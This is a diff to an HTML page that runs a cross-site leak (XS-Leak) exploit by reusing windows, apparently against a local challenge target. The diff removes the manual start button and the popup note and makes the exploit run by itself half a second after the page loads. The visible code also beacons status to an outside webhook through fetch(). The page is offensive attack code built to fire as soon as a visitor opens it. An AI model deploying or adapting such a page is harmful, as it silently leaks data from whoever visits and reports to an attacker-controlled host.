@@ -3,7 +3,6 @@
 <head><title>Window Reuse XS-Leak</title></head>
 <body>
 <h1>XS-Leak - Window Reuse Technique</h1>
-<button id="startBtn" onclick="start()" style="padding:10px 20px; font-size:16px;">Start Exploit</button>
 <pre id="output"></pre>
 <script>
 const TARGET = 'https://127.0.0.1:9999/';
@@ -72,7 +71,6 @@ async function check(candidate) {
 }
 
 async function start() {
-    document.getElementById('startBtn').disabled = true;
     log('Starting exploit with window reuse technique...\n');
     
     fetch(WEBHOOK + '?status=reuse_started').catch(e=>{});
@@ -131,8 +129,10 @@ async function start() {
     }
 }
 
-log('Click "Start Exploit" button when ready!\n');
-log('Note: Allow popups for this page.\n');
+log('Auto-starting exploit...\n');
+
+// Auto-start after page loads
+setTimeout(start, 500);
 </script>
 </body>
 </html>
